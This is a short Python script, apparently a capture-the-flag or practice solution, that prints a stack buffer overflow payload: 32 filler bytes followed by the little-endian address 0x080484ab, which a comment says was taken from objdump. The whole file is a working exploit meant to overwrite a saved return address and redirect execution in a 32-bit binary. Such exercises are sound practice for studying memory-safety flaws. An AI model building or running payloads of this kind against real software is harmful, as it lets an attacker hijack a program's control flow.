#!/usr/bin/env python3

import sys

# Address from Objdump: 0x080484ab
sys.stdout.buffer.write(b"a"*32 + b"\xab\x84\x04\x08")

